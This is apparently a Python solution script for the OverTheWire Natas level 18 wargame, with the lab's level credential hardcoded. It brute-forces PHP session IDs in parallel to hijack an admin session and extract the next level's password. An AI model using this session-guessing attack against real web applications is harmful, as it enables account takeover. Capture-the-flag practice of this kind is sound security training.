import requests
from concurrent.futures import ThreadPoolExecutor

username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
base_url = "http://natas18.natas.labs.overthewire.org/index.php?debug=1"

print("Brute forcing session ID...")
def check_session_id(session_id):
    r = requests.post(base_url, auth=(username, password), headers={"Cookie": "PHPSESSID=" + str(session_id)})
    if "You are an admin" in r.text:
        return session_id, r.text
    return None

def main():
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_session_id, i) for i in range(640)]
        for future in futures:
            result = future.result()
            if result:
                executor.shutdown(wait=False, cancel_futures=True)
                session_id, output = result
                pass_index = output.rfind("Password: ") + len("Password: ") 
                print(f"Session ID founded!: {session_id}\n")
                print("########## DATA ##########\n")
                print("Username: natas19")
                print("Password: "+output[pass_index:pass_index+32])
                break


if __name__ == "__main__":
    main()